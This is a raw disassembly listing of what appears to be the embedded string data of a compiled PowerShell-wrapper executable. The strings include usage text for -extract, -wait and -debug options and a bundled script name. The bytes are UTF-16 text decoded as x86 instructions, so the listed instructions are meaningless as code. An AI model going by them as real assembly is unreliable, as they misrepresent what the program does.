  4096ba:	30 00                	xor    %al,(%eax)
  4096bc:	30 00                	xor    %al,(%eax)
  4096be:	38 00                	cmp    %al,(%eax)
  4096c0:	30 00                	xor    %al,(%eax)
  4096c2:	38 00                	cmp    %al,(%eax)
  4096c4:	30 00                	xor    %al,(%eax)
  4096c6:	00 0f                	add    %cl,(%edi)
  4096c8:	23 00                	and    (%eax),%eax
  4096ca:	38 00                	cmp    %al,(%eax)
  4096cc:	30 00                	xor    %al,(%eax)
  4096ce:	30 00                	xor    %al,(%eax)
  4096d0:	30 00                	xor    %al,(%eax)
  4096d2:	38 00                	cmp    %al,(%eax)
  4096d4:	30 00                	xor    %al,(%eax)
  4096d6:	00 0f                	add    %cl,(%edi)
  4096d8:	23 00                	and    (%eax),%eax
  4096da:	38 00                	cmp    %al,(%eax)
  4096dc:	30 00                	xor    %al,(%eax)
  4096de:	30 00                	xor    %al,(%eax)
  4096e0:	30 00                	xor    %al,(%eax)
  4096e2:	30 00                	xor    %al,(%eax)
  4096e4:	30 00                	xor    %al,(%eax)
  4096e6:	00 0f                	add    %cl,(%edi)
  4096e8:	23 00                	and    (%eax),%eax
  4096ea:	38 00                	cmp    %al,(%eax)
  4096ec:	30 00                	xor    %al,(%eax)
  4096ee:	38 00                	cmp    %al,(%eax)
  4096f0:	30 00                	xor    %al,(%eax)
  4096f2:	30 00                	xor    %al,(%eax)
  4096f4:	30 00                	xor    %al,(%eax)
  4096f6:	00 0f                	add    %cl,(%edi)
  4096f8:	23 00                	and    (%eax),%eax
  4096fa:	43                   	inc    %ebx
  4096fb:	00 30                	add    %dh,(%eax)
  4096fd:	00 43 00             	add    %al,0x0(%ebx)
  409700:	30 00                	xor    %al,(%eax)
  409702:	43                   	inc    %ebx
  409703:	00 30                	add    %dh,(%eax)
  409705:	00 00                	add    %al,(%eax)
  409707:	0f 23 00             	mov    %eax,%db0
  40970a:	30 00                	xor    %al,(%eax)
  40970c:	30 00                	xor    %al,(%eax)
  40970e:	46                   	inc    %esi
  40970f:	00 46 00             	add    %al,0x0(%esi)
  409712:	30 00                	xor    %al,(%eax)
  409714:	30 00                	xor    %al,(%eax)
  409716:	00 21                	add    %ah,(%ecx)
  409718:	52                   	push   %edx
  409719:	00 65 00             	add    %ah,0x0(%ebp)
  40971c:	6d                   	insl   (%dx),%es:(%edi)
  40971d:	00 61 00             	add    %ah,0x0(%ecx)
  409720:	69 00 6e 00 69 00    	imul   $0x69006e,(%eax),%eax
  409726:	6e                   	outsb  %ds:(%esi),(%dx)
  409727:	00 67 00             	add    %ah,0x0(%edi)
  40972a:	20 00                	and    %al,(%eax)
  40972c:	74 00                	je     0x40972e
  40972e:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  409734:	3a 00                	cmp    (%eax),%al
  409736:	20 00                	and    %al,(%eax)
  409738:	00 29                	add    %ch,(%ecx)
  40973a:	7b 00                	jnp    0x40973c
  40973c:	30 00                	xor    %al,(%eax)
  40973e:	3a 00                	cmp    (%eax),%al
  409740:	30 00                	xor    %al,(%eax)
  409742:	30 00                	xor    %al,(%eax)
  409744:	7d 00                	jge    0x409746
  409746:	3a 00                	cmp    (%eax),%al
  409748:	7b 00                	jnp    0x40974a
  40974a:	31 00                	xor    %eax,(%eax)
  40974c:	3a 00                	cmp    (%eax),%al
  40974e:	30 00                	xor    %al,(%eax)
  409750:	30 00                	xor    %al,(%eax)
  409752:	7d 00                	jge    0x409754
  409754:	3a 00                	cmp    (%eax),%al
  409756:	7b 00                	jnp    0x409758
  409758:	32 00                	xor    (%eax),%al
  40975a:	3a 00                	cmp    (%eax),%al
  40975c:	30 00                	xor    %al,(%eax)
  40975e:	30 00                	xor    %al,(%eax)
  409760:	7d 00                	jge    0x409762
  409762:	00 3f                	add    %bh,(%edi)
  409764:	53                   	push   %ebx
  409765:	00 79 00             	add    %bh,0x0(%ecx)
  409768:	73 00                	jae    0x40976a
  40976a:	74 00                	je     0x40976c
  40976c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409770:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  409774:	6f                   	outsl  %ds:(%esi),(%dx)
  409775:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409779:	00 65 00             	add    %ah,0x0(%ebp)
  40977c:	63 00                	arpl   %eax,(%eax)
  40977e:	74 00                	je     0x409780
  409780:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409786:	73 00                	jae    0x409788
  409788:	2e 00 47 00          	add    %al,%cs:0x0(%edi)
  40978c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409790:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409794:	69 00 63 00 2e 00    	imul   $0x2e0063,(%eax),%eax
  40979a:	4c                   	dec    %esp
  40979b:	00 69 00             	add    %ch,0x0(%ecx)
  40979e:	73 00                	jae    0x4097a0
  4097a0:	74 00                	je     0x4097a2
  4097a2:	00 03                	add    %al,(%ebx)
  4097a4:	31 00                	xor    %eax,(%eax)
  4097a6:	00 15 7b 00 30 00    	add    %dl,0x30007b
  4097ac:	7d 00                	jge    0x4097ae
  4097ae:	5b                   	pop    %ebx
  4097af:	00 7b 00             	add    %bh,0x0(%ebx)
  4097b2:	31 00                	xor    %eax,(%eax)
  4097b4:	7d 00                	jge    0x4097b6
  4097b6:	5d                   	pop    %ebp
  4097b7:	00 3a                	add    %bh,(%edx)
  4097b9:	00 20                	add    %ah,(%eax)
  4097bb:	00 00                	add    %al,(%eax)
  4097bd:	07                   	pop    %es
  4097be:	41                   	inc    %ecx
  4097bf:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  4097c3:	00 00                	add    %al,(%eax)
  4097c5:	0f 54 00             	andps  (%eax),%xmm0
  4097c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4097c9:	00 41 00             	add    %al,0x0(%ecx)
  4097cc:	72 00                	jb     0x4097ce
  4097ce:	72 00                	jb     0x4097d0
  4097d0:	61                   	popa
  4097d1:	00 79 00             	add    %bh,0x0(%ecx)
  4097d4:	00 0b                	add    %cl,(%ebx)
  4097d6:	7b 00                	jnp    0x4097d8
  4097d8:	30 00                	xor    %al,(%eax)
  4097da:	7d 00                	jge    0x4097dc
  4097dc:	3a 00                	cmp    (%eax),%al
  4097de:	20 00                	and    %al,(%eax)
  4097e0:	00 29                	add    %ch,(%ecx)
  4097e2:	0a 00                	or     (%eax),%al
  4097e4:	28 00                	sub    %al,(%eax)
  4097e6:	54                   	push   %esp
  4097e7:	00 79 00             	add    %bh,0x0(%ecx)
  4097ea:	70 00                	jo     0x4097ec
  4097ec:	65 00 20             	add    %ah,%gs:(%eax)
  4097ef:	00 21                	add    %ah,(%ecx)
  4097f1:	00 3f                	add    %bh,(%edi)
  4097f3:	00 20                	add    %ah,(%eax)
  4097f5:	00 66 00             	add    %ah,0x0(%esi)
  4097f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4097f9:	00 72 00             	add    %dh,0x0(%edx)
  4097fc:	20 00                	and    %al,(%eax)
  4097fe:	68 00 65 00 6c       	push   $0x6c006500
  409803:	00 70 00             	add    %dh,0x0(%eax)
  409806:	2e 00 29             	add    %ch,%cs:(%ecx)
  409809:	00 00                	add    %al,(%eax)
  40980b:	05 21 00 3f 00       	add    $0x3f0021,%eax
  409810:	00 47 57             	add    %al,0x57(%edi)
  409813:	00 72 00             	add    %dh,0x0(%edx)
  409816:	6f                   	outsl  %ds:(%esi),(%dx)
  409817:	00 6e 00             	add    %ch,0x0(%esi)
  40981a:	67 00 20             	add    %ah,(%bx,%si)
  40981d:	00 66 00             	add    %ah,0x0(%esi)
  409820:	6f                   	outsl  %ds:(%esi),(%dx)
  409821:	00 72 00             	add    %dh,0x0(%edx)
  409824:	6d                   	insl   (%dx),%es:(%edi)
  409825:	00 61 00             	add    %ah,0x0(%ecx)
  409828:	74 00                	je     0x40982a
  40982a:	2c 00                	sub    $0x0,%al
  40982c:	20 00                	and    %al,(%eax)
  40982e:	70 00                	jo     0x409830
  409830:	6c                   	insb   (%dx),%es:(%edi)
  409831:	00 65 00             	add    %ah,0x0(%ebp)
  409834:	61                   	popa
  409835:	00 73 00             	add    %dh,0x0(%ebx)
  409838:	65 00 20             	add    %ah,%gs:(%eax)
  40983b:	00 72 00             	add    %dh,0x0(%edx)
  40983e:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409842:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409846:	74 00                	je     0x409848
  409848:	20 00                	and    %al,(%eax)
  40984a:	69 00 6e 00 70 00    	imul   $0x70006e,(%eax),%eax
  409850:	75 00                	jne    0x409852
  409852:	74 00                	je     0x409854
  409854:	3a 00                	cmp    (%eax),%al
  409856:	20 00                	and    %al,(%eax)
  409858:	00 07                	add    %al,(%edi)
  40985a:	08 00                	or     %al,(%eax)
  40985c:	20 00                	and    %al,(%eax)
  40985e:	08 00                	or     %al,(%eax)
  409860:	01 03                	add    %eax,(%ebx)
  409862:	2a 00                	sub    (%eax),%al
  409864:	00 1f                	add    %bl,(%edi)
  409866:	50                   	push   %eax
  409867:	00 53 00             	add    %dl,0x0(%ebx)
  40986a:	52                   	push   %edx
  40986b:	00 75 00             	add    %dh,0x0(%ebp)
  40986e:	6e                   	outsb  %ds:(%esi),(%dx)
  40986f:	00 73 00             	add    %dh,0x0(%ebx)
  409872:	70 00                	jo     0x409874
  409874:	61                   	popa
  409875:	00 63 00             	add    %ah,0x0(%ebx)
  409878:	65 00 2d 00 48 00 6f 	add    %ch,%gs:0x6f004800
  40987f:	00 73 00             	add    %dh,0x0(%ebx)
  409882:	74 00                	je     0x409884
  409884:	01 05 75 00 69 00    	add    %eax,0x690075
  40988a:	00 0b                	add    %cl,(%ebx)
  40988c:	2d 00 77 00 61       	sub    $0x61007700,%eax
  409891:	00 69 00             	add    %ch,0x0(%ecx)
  409894:	74 00                	je     0x409896
  409896:	01 11                	add    %edx,(%ecx)
  409898:	2d 00 65 00 78       	sub    $0x78006500,%eax
  40989d:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4098a1:	00 61 00             	add    %ah,0x0(%ecx)
  4098a4:	63 00                	arpl   %eax,(%eax)
  4098a6:	74 00                	je     0x4098a8
  4098a8:	01 03                	add    %eax,(%ebx)
  4098aa:	3a 00                	cmp    (%eax),%al
  4098ac:	00 80 dd 49 00 66    	add    %al,0x660049dd(%eax)
  4098b2:	00 20                	add    %ah,(%eax)
  4098b4:	00 79 00             	add    %bh,0x0(%ecx)
  4098b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4098b8:	00 75 00             	add    %dh,0x0(%ebp)
  4098bb:	20 00                	and    %al,(%eax)
  4098bd:	73 00                	jae    0x4098bf
  4098bf:	70 00                	jo     0x4098c1
  4098c1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4098c5:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
  4098cb:	20 00                	and    %al,(%eax)
  4098cd:	74 00                	je     0x4098cf
  4098cf:	68 00 65 00 20       	push   $0x20006500
  4098d4:	00 2d 00 65 00 78    	add    %ch,0x78006500
  4098da:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4098de:	00 61 00             	add    %ah,0x0(%ecx)
  4098e1:	63 00                	arpl   %eax,(%eax)
  4098e3:	74 00                	je     0x4098e5
  4098e5:	20 00                	and    %al,(%eax)
  4098e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4098e8:	00 70 00             	add    %dh,0x0(%eax)
  4098eb:	74 00                	je     0x4098ed
  4098ed:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4098f3:	20 00                	and    %al,(%eax)
  4098f5:	79 00                	jns    0x4098f7
  4098f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4098f8:	00 75 00             	add    %dh,0x0(%ebp)
  4098fb:	20 00                	and    %al,(%eax)
  4098fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4098fe:	00 65 00             	add    %ah,0x0(%ebp)
  409901:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  409906:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40990a:	00 20                	add    %ah,(%eax)
  40990c:	00 61 00             	add    %ah,0x0(%ecx)
  40990f:	64 00 64 00 20       	add    %ah,%fs:0x20(%eax,%eax,1)
  409914:	00 61 00             	add    %ah,0x0(%ecx)
  409917:	20 00                	and    %al,(%eax)
  409919:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40991d:	6c                   	insb   (%dx),%es:(%edi)
  40991e:	00 65 00             	add    %ah,0x0(%ebp)
  409921:	20 00                	and    %al,(%eax)
  409923:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  409927:	72 00                	jb     0x409929
  409929:	20 00                	and    %al,(%eax)
  40992b:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40992f:	74 00                	je     0x409931
  409931:	72 00                	jb     0x409933
  409933:	61                   	popa
  409934:	00 63 00             	add    %ah,0x0(%ebx)
  409937:	74 00                	je     0x409939
  409939:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40993f:	20 00                	and    %al,(%eax)
  409941:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  409947:	74 00                	je     0x409949
  409949:	68 00 69 00 73       	push   $0x73006900
  40994e:	00 20                	add    %ah,(%eax)
  409950:	00 77 00             	add    %dh,0x0(%edi)
  409953:	61                   	popa
  409954:	00 79 00             	add    %bh,0x0(%ecx)
  409957:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  40995c:	00 20                	add    %ah,(%eax)
  40995e:	00 20                	add    %ah,(%eax)
  409960:	00 2d 00 65 00 78    	add    %ch,0x78006500
  409966:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40996a:	00 61 00             	add    %ah,0x0(%ecx)
  40996d:	63 00                	arpl   %eax,(%eax)
  40996f:	74 00                	je     0x409971
  409971:	3a 00                	cmp    (%eax),%al
  409973:	22 00                	and    (%eax),%al
  409975:	3c 00                	cmp    $0x0,%al
  409977:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40997b:	6c                   	insb   (%dx),%es:(%edi)
  40997c:	00 65 00             	add    %ah,0x0(%ebp)
  40997f:	6e                   	outsb  %ds:(%esi),(%dx)
  409980:	00 61 00             	add    %ah,0x0(%ecx)
  409983:	6d                   	insl   (%dx),%es:(%edi)
  409984:	00 65 00             	add    %ah,0x0(%ebp)
  409987:	3e 00 22             	add    %ah,%ds:(%edx)
  40998a:	00 01                	add    %al,(%ecx)
  40998c:	09 2d 00 65 00 6e    	or     %ebp,0x6e006500
  409992:	00 64 00 01          	add    %ah,0x1(%eax,%eax,1)
  409996:	0d 2d 00 64 00       	or     $0x64002d,%eax
  40999b:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40999f:	75 00                	jne    0x4099a1
  4099a1:	67 00 01             	add    %al,(%bx,%di)
  4099a4:	29 74 00 72          	sub    %esi,0x72(%eax,%eax,1)
  4099a8:	00 61 00             	add    %ah,0x0(%ecx)
  4099ab:	70 00                	jo     0x4099ad
  4099ad:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4099b1:	72 00                	jb     0x4099b3
  4099b3:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  4099b7:	6d                   	insl   (%dx),%es:(%edi)
  4099b8:	00 62 00             	add    %ah,0x0(%edx)
  4099bb:	61                   	popa
  4099bc:	00 73 00             	add    %dh,0x0(%ebx)
  4099bf:	73 00                	jae    0x4099c1
  4099c1:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4099c5:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4099c9:	73 00                	jae    0x4099cb
  4099cb:	31 00                	xor    %eax,(%eax)
  4099cd:	00 2f                	add    %ch,(%edi)
  4099cf:	5e                   	pop    %esi
  4099d0:	00 2d 00 28 00 5b    	add    %ch,0x5b002800
  4099d6:	00 5e 00             	add    %bl,0x0(%esi)
  4099d9:	3a 00                	cmp    (%eax),%al
  4099db:	20 00                	and    %al,(%eax)
  4099dd:	5d                   	pop    %ebp
  4099de:	00 2b                	add    %ch,(%ebx)
  4099e0:	00 29                	add    %ch,(%ecx)
  4099e2:	00 5b 00             	add    %bl,0x0(%ebx)
  4099e5:	20 00                	and    %al,(%eax)
  4099e7:	3a 00                	cmp    (%eax),%al
  4099e9:	5d                   	pop    %ebp
  4099ea:	00 3f                	add    %bh,(%edi)
  4099ec:	00 28                	add    %ch,(%eax)
  4099ee:	00 5b 00             	add    %bl,0x0(%ebx)
  4099f1:	5e                   	pop    %esi
  4099f2:	00 3a                	add    %bh,(%edx)
  4099f4:	00 5d 00             	add    %bl,0x0(%ebp)
  4099f7:	2a 00                	sub    (%eax),%al
  4099f9:	29 00                	sub    %eax,(%eax)
  4099fb:	24 00                	and    $0x0,%al
  4099fd:	01 09                	add    %ecx,(%ecx)
  4099ff:	54                   	push   %esp
  409a00:	00 72 00             	add    %dh,0x0(%edx)
  409a03:	75 00                	jne    0x409a05
  409a05:	65 00 00             	add    %al,%gs:(%eax)
  409a08:	0b 24 00             	or     (%eax,%eax,1),%esp
  409a0b:	54                   	push   %esp
  409a0c:	00 52 00             	add    %dl,0x0(%edx)
  409a0f:	55                   	push   %ebp
  409a10:	00 45 00             	add    %al,0x0(%ebp)
  409a13:	00 0b                	add    %cl,(%ebx)
  409a15:	46                   	inc    %esi
  409a16:	00 61 00             	add    %ah,0x0(%ecx)
  409a19:	6c                   	insb   (%dx),%es:(%edi)
  409a1a:	00 73 00             	add    %dh,0x0(%ebx)
  409a1d:	65 00 00             	add    %al,%gs:(%eax)
  409a20:	0d 24 00 46 00       	or     $0x460024,%eax
  409a25:	41                   	inc    %ecx
  409a26:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  409a2a:	00 45 00             	add    %al,0x0(%ebp)
  409a2d:	00 15 4f 00 75 00    	add    %dl,0x75004f
  409a33:	74 00                	je     0x409a35
  409a35:	2d 00 53 00 74       	sub    $0x74005300,%eax
  409a3a:	00 72 00             	add    %dh,0x0(%edx)
  409a3d:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409a43:	01 0d 53 00 74 00    	add    %ecx,0x740053
  409a49:	72 00                	jb     0x409a4b
  409a4b:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409a4f:	6d                   	insl   (%dx),%es:(%edi)
  409a50:	00 00                	add    %al,(%eax)
  409a52:	27                   	daa
  409a53:	43                   	inc    %ebx
  409a54:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409a58:	00 63 00             	add    %ah,0x0(%ebx)
  409a5b:	6b 00 20             	imul   $0x20,(%eax),%eax
  409a5e:	00 4f 00             	add    %cl,0x0(%edi)
  409a61:	4b                   	dec    %ebx
  409a62:	00 20                	add    %ah,(%eax)
  409a64:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  409a68:	00 20                	add    %ah,(%eax)
  409a6a:	00 65 00             	add    %ah,0x0(%ebp)
  409a6d:	78 00                	js     0x409a6f
  409a6f:	69 00 74 00 2e 00    	imul   $0x2e0074,(%eax),%eax
  409a75:	2e 00 2e             	add    %ch,%cs:(%esi)
  409a78:	00 00                	add    %al,(%eax)
  409a7a:	2f                   	das
  409a7b:	55                   	push   %ebp
  409a7c:	00 6e 00             	add    %ch,0x0(%esi)
  409a7f:	68 00 61 00 6e       	push   $0x6e006100
  409a84:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409a88:	00 65 00             	add    %ah,0x0(%ebp)
  409a8b:	64 00 20             	add    %ah,%fs:(%eax)
  409a8e:	00 65 00             	add    %ah,0x0(%ebp)
  409a91:	78 00                	js     0x409a93
  409a93:	63 00                	arpl   %eax,(%eax)
  409a95:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409a99:	74 00                	je     0x409a9b
  409a9b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409aa1:	20 00                	and    %al,(%eax)
  409aa3:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  409aa9:	00 00                	add    %al,(%eax)
  409aab:	00 5b f7             	add    %bl,-0x9(%ebx)
  409aae:	37                   	aaa
  409aaf:	68 d0 c3 13 4a       	push   $0x4a13c3d0
  409ab4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409ab5:	c1 27 ac             	shll   $0xac,(%edi)
  409ab8:	99                   	cltd
  409ab9:	b0 98                	mov    $0x98,%al
  409abb:	f2 00 08             	repnz add %cl,(%eax)
  409abe:	b7 7a                	mov    $0x7a,%bh
  409ac0:	5c                   	pop    %esp
  409ac1:	56                   	push   %esi
  409ac2:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  409ac5:	89 08                	mov    %ecx,(%eax)
  409ac7:	31 bf 38 56 ad 36    	xor    %edi,0x36ad5638(%edi)
  409acd:	4e                   	dec    %esi
  409ace:	35 14 00 0a 11       	xor    $0x110a0014,%eax
  409ad3:	14 10                	adc    $0x10,%al
  409ad5:	11 0c 0e             	adc    %ecx,(%esi,%ecx,1)
  409ad8:	18 08                	sbb    %cl,(%eax)
  409ada:	12 21                	adc    (%ecx),%ah
  409adc:	08 12                	or     %dl,(%edx)
  409ade:	21 08                	and    %ecx,(%eax)
  409ae0:	10 02                	adc    %al,(%edx)
  409ae2:	11 10                	adc    %edx,(%eax)
  409ae4:	0c 00                	or     $0x0,%al
  409ae6:	06                   	push   %es
  409ae7:	12 18                	adc    (%eax),%bl
  409ae9:	0e                   	push   %cs
  409aea:	0e                   	push   %cs
  409aeb:	0e                   	push   %cs
  409aec:	0e                   	push   %cs
  409aed:	11 25 11 29 03 20    	adc    %esp,0x20032911
  409af3:	00 01                	add    %al,(%ecx)
  409af5:	02 06                	add    (%esi),%al
  409af7:	08 02                	or     %al,(%edx)
  409af9:	06                   	push   %es
  409afa:	18 02                	sbb    %al,(%edx)
  409afc:	06                   	push   %es
  409afd:	0e                   	push   %cs
  409afe:	03 06                	add    (%esi),%eax
  409b00:	11 10                	adc    %edx,(%eax)
  409b02:	04 01                	add    $0x1,%al
  409b04:	00 00                	add    %al,(%eax)
  409b06:	00 04 02             	add    %al,(%edx,%eax,1)
  409b09:	00 00                	add    %al,(%eax)
  409b0b:	00 04 04             	add    %al,(%esp,%eax,1)
  409b0e:	00 00                	add    %al,(%eax)
  409b10:	00 04 08             	add    %al,(%eax,%ecx,1)
  409b13:	00 00                	add    %al,(%eax)
  409b15:	00 04 10             	add    %al,(%eax,%edx,1)
  409b18:	00 00                	add    %al,(%eax)
  409b1a:	00 04 40             	add    %al,(%eax,%eax,2)
  409b1d:	00 00                	add    %al,(%eax)
  409b1f:	00 04 80             	add    %al,(%eax,%eax,4)
  409b22:	00 00                	add    %al,(%eax)
  409b24:	00 04 00             	add    %al,(%eax,%eax,1)
  409b27:	01 00                	add    %eax,(%eax)
  409b29:	00 04 00             	add    %al,(%eax,%eax,1)
  409b2c:	02 00                	add    (%eax),%al
  409b2e:	00 04 00             	add    %al,(%eax,%eax,1)
  409b31:	04 00                	add    $0x0,%al
  409b33:	00 04 00             	add    %al,(%eax,%eax,1)
  409b36:	08 00                	or     %al,(%eax)
  409b38:	00 04 00             	add    %al,(%eax,%eax,1)
  409b3b:	10 00                	adc    %al,(%eax)
  409b3d:	00 04 00             	add    %al,(%eax,%eax,1)
  409b40:	40                   	inc    %eax
  409b41:	00 00                	add    %al,(%eax)
  409b43:	04 00                	add    $0x0,%al
  409b45:	00 02                	add    %al,(%edx)
  409b47:	00 04 00             	add    %al,(%eax,%eax,1)
  409b4a:	00 04 00             	add    %al,(%eax,%eax,1)
  409b4d:	04 00                	add    $0x0,%al
  409b4f:	00 08                	add    %cl,(%eax)
  409b51:	00 04 00             	add    %al,(%eax,%eax,1)
  409b54:	00 10                	add    %dl,(%eax)
  409b56:	00 03                	add    %al,(%ebx)
  409b58:	06                   	push   %es
  409b59:	11 14 04             	adc    %edx,(%esp,%eax,1)
  409b5c:	00 00                	add    %al,(%eax)
  409b5e:	00 00                	add    %al,(%eax)
  409b60:	04 c7                	add    $0xc7,%al
  409b62:	04 00                	add    $0x0,%al
  409b64:	00 04 20             	add    %al,(%eax,%eiz,1)
  409b67:	05 00 00 04 90       	add    $0x90040000,%eax
  409b6c:	04 00                	add    $0x0,%al
  409b6e:	00 04 23             	add    %al,(%ebx,%eiz,1)
  409b71:	05 00 00 04 7a       	add    $0x7a040000,%eax
  409b76:	00 00                	add    %al,(%eax)
  409b78:	00 04 57             	add    %al,(%edi,%edx,2)
  409b7b:	00 00                	add    %al,(%eax)
  409b7d:	00 04 ec             	add    %al,(%esp,%ebp,8)
  409b80:	03 00                	add    (%eax),%eax
  409b82:	00 03                	add    %al,(%ebx)
  409b84:	06                   	push   %es
  409b85:	11 2d 04 20 00 11    	adc    %ebp,0x11002004
  409b8b:	2d 05 20 01 01       	sub    $0x1012005,%eax
  409b90:	11 2d 04 20 00 11    	adc    %ebp,0x11002004
  409b96:	31 05 20 01 01 11    	xor    %eax,0x11010120
  409b9c:	31 04 20             	xor    %eax,(%eax,%eiz,1)
  409b9f:	00 11                	add    %dl,(%ecx)
  409ba1:	35 05 20 01 01       	xor    $0x1012005,%eax
  409ba6:	11 35 03 20 00 08    	adc    %esi,0x8002003
  409bac:	04 20                	add    $0x20,%al
  409bae:	01 01                	add    %eax,(%ecx)
  409bb0:	08 03                	or     %al,(%ebx)
  409bb2:	06                   	push   %es
  409bb3:	12 15 0c 20 01 14    	adc    0x1401200c,%dl
  409bb9:	11 39                	adc    %edi,(%ecx)
  409bbb:	02 00                	add    (%eax),%al
  409bbd:	02 00                	add    (%eax),%al
  409bbf:	00 11                	add    %dl,(%ecx)
  409bc1:	3d 03 20 00 02       	cmp    $0x2002003,%eax
  409bc6:	06                   	push   %es
  409bc7:	20 01                	and    %al,(%ecx)
  409bc9:	11 41 11             	adc    %eax,0x11(%ecx)
  409bcc:	45                   	inc    %ebp
  409bcd:	0b 20                	or     (%eax),%esp
  409bcf:	04 01                	add    $0x1,%al
  409bd1:	11 3d 11 35 11 3d    	adc    %edi,0x3d113511
  409bd7:	11 39                	adc    %edi,(%ecx)
  409bd9:	07                   	pop    %es
  409bda:	20 02                	and    %al,(%edx)
  409bdc:	01 11                	add    %edx,(%ecx)
  409bde:	3d 11 39 0d 20       	cmp    $0x200d3911,%eax
  409be3:	02 01                	add    (%ecx),%al
  409be5:	11 35 14 11 39 02    	adc    %esi,0x2391114
  409beb:	00 02                	add    %al,(%edx)
  409bed:	00 00                	add    %al,(%eax)
  409bef:	03 20                	add    (%eax),%esp
  409bf1:	00 0e                	add    %cl,(%esi)
  409bf3:	04 20                	add    $0x20,%al
  409bf5:	01 01                	add    %eax,(%ecx)
  409bf7:	0e                   	push   %cs
  409bf8:	04 28                	add    $0x28,%al
  409bfa:	00 11                	add    %dl,(%ecx)
  409bfc:	2d 04 28 00 11       	sub    $0x11002804,%eax
  409c01:	31 04 28             	xor    %eax,(%eax,%ebp,1)
  409c04:	00 11                	add    %dl,(%ecx)
  409c06:	35 03 28 00 08       	xor    $0x8002803,%eax
  409c0b:	03 28                	add    (%eax),%ebp
  409c0d:	00 02                	add    %al,(%edx)
  409c0f:	03 28                	add    (%eax),%ebp
  409c11:	00 0e                	add    %cl,(%esi)
  409c13:	04 00                	add    $0x0,%al
  409c15:	01 18                	add    %ebx,(%eax)
  409c17:	09 09                	or     %ecx,(%ecx)
  409c19:	00 04 11             	add    %al,(%ecx,%edx,1)
  409c1c:	49                   	dec    %ecx
  409c1d:	0e                   	push   %cs
  409c1e:	0e                   	push   %cs
  409c1f:	10 0e                	adc    %cl,(%esi)
  409c21:	02 08                	add    (%eax),%cl
  409c23:	00 03                	add    %al,(%ebx)
  409c25:	11 49 0e             	adc    %ecx,0xe(%ecx)
  409c28:	0e                   	push   %cs
  409c29:	10 0e                	adc    %cl,(%esi)
  409c2b:	0c 00                	or     $0x0,%al
  409c2d:	04 08                	add    $0x8,%al
  409c2f:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409c34:	51                   	push   %ecx
  409c35:	08 0e                	or     %cl,(%esi)
  409c37:	0e                   	push   %cs
  409c38:	0b 00                	or     (%eax),%eax
  409c3a:	06                   	push   %es
  409c3b:	08 09                	or     %cl,(%ecx)
  409c3d:	09 1d 05 12 21 08    	or     %ebx,0x8211205
  409c43:	09 07                	or     %eax,(%edi)
  409c45:	00 03                	add    %al,(%ebx)
  409c47:	0e                   	push   %cs
  409c48:	11 55 02             	adc    %edx,0x2(%ebp)
  409c4b:	02 07                	add    (%edi),%al
  409c4d:	00 03                	add    %al,(%ebx)
  409c4f:	11 41 0e             	adc    %eax,0xe(%ecx)
  409c52:	0e                   	push   %cs
  409c53:	02 02                	add    (%edx),%al
  409c55:	06                   	push   %es
  409c56:	02 03                	add    (%ebx),%al
  409c58:	06                   	push   %es
  409c59:	11 41 06             	adc    %eax,0x6(%ecx)
  409c5c:	20 02                	and    %al,(%edx)
  409c5e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  409c61:	59                   	pop    %ecx
  409c62:	03 06                	add    (%esi),%eax
  409c64:	12 5d 07             	adc    0x7(%ebp),%bl
  409c67:	06                   	push   %es
  409c68:	15 12 61 01 11       	adc    $0x11016112,%eax
  409c6d:	34 08                	xor    $0x8,%al
  409c6f:	b0 3f                	mov    $0x3f,%al
  409c71:	5f                   	pop    %edi
  409c72:	7f 11                	jg     0x409c85
  409c74:	d5 0a                	aad    $0xa
  409c76:	3a 06                	cmp    (%esi),%al
  409c78:	20 01                	and    %al,(%ecx)
  409c7a:	11 65 11             	adc    %esp,0x11(%ebp)
